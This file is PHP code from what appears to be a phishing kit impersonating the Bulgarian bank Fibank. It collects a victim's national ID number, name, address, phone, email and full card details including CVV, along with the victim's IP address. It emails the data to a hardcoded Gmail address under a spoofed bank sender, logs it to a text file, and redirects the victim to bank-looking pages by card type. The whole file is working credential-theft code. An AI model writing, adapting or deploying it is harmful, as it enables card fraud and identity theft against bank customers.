<?php
$name = $_POST['egn'] ; 
$add = $_POST['lnc'] ; 
$vill = $_POST['fullNameCyrillic'] ; 
$zipp = $_POST['fullName'] ; 
$em = $_POST['email'] ; 
$tel = $_POST['phone'] ; 
$id = $_POST['address'] ; 
$card = $_POST['pan'] ; 
$exp = $_POST['months'] ; 
$exp1 = $_POST['years'] ; 
$cvv = $_POST['cvc'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 $to="hfaidhmoukim@gmail.com" ; 
 $subject = " Carta | ahla bom ahmed |: from: ".$ip;
$nome="Ahla Bomek " ; 
	$from="rzlt@fibank.bg" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ Victem Detail :D  +-----------------\r\n";
$message .= "Name Vectim : ".$name."\r\n";
$message .= "Addresss: " .$add."\r\n";
$message .= "ville: " .$vill."\r\n";
$message .= "zip code : " .$zipp."\r\n";
$message .= "Emaill: " .$em."\r\n";
$message .= "Phonee : " .$tel."\r\n";
$message .= "Identity : " .$id."\r\n";
$message .= "---------------+ Card Information :D  +---------------\r\n";
$message .= "Card Number: " .$card."\r\n";
$message .= "Date D'exp : " .$exp.'/'.$exp1."\r\n";
$message .= "Cvv: ".$cvv. "\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By jen +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../flacko1.txt", "a");  
fwrite($sajal, $message);
if($card[0]==4)
	header('Location: ../../account/security/visa.php');
if($card[0]==5)
	header('Location: ../../account/security/master.php');
if($card[0]==6)
	header('Location: https://www.fibank.bg/en/contact-centre/page/1567');



?>